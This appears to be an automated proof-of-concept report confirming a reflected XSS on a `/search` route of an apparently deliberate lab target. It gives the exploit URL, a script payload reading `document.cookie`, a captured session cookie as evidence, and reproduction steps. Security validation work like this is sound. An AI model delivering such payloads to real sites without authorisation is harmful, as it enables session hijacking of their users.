# XSS Validation PoC — CONFIRMED

**Generated:** 2026-10-27T02:31:28.804Z

## Summary
- **Validated (executed AND control clean):** YES
- **Vulnerability:** Reflected XSS
- **Route:** `GET /search` (param `q`)
- **Auth required:** YES — authenticated as `alice`

## SAST -> DAST bridge
- **SAST (opengrep):** `opengrep-rules.vuln-target-express-reflected-xss` at `routes/search.js:18` (CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'))
- **DAST gap:** a standard authenticated ZAP scan did **not** reach this route (confirmed from the ZAP report)
- **Bridge:** the agent resolved the route, parameter, and auth requirement from source,
  authenticated, and delivered a payload to an endpoint a link-following crawler never reaches.

## Exploit
```
http://vuln-target:3000/search?q=%3Cscript%3Edocument.title%3D'XSS-CONFIRMED-'%2Bdocument.cookie%3C%2Fscript%3E
```
Payload:
```html
<script>document.title='XSS-CONFIRMED-'+document.cookie</script>
```
**Evidence — execution confirmed:** the page title became `XSS-CONFIRMED-connect.sid=s%3AXdwddLeSg9bi0Upxnkeql_JXY8kiEQdX.pKmC5MNJEpPKgwgErURkjsrimd2L8Za4bU%2B7qy1%2BKfw`.
The injected script ran (it set `document.title` and read `document.cookie`) — this is execution,
not mere reflection. executed=YES

## Negative control
```
http://vuln-target:3000/search?q=hello
```
- Title: `Search · VulnTarget` — clean=YES, input reflected=YES
- The benign input is reflected but does **not** execute — ruling out a false positive.

## Reproduction
1. Log in as `alice`.
2. Visit the exploit URL above.
3. Observe the browser tab title change to `XSS-CONFIRMED-<cookie>` — the script executed with access to `document.cookie`.
4. Compare with the negative control, which stays clean.
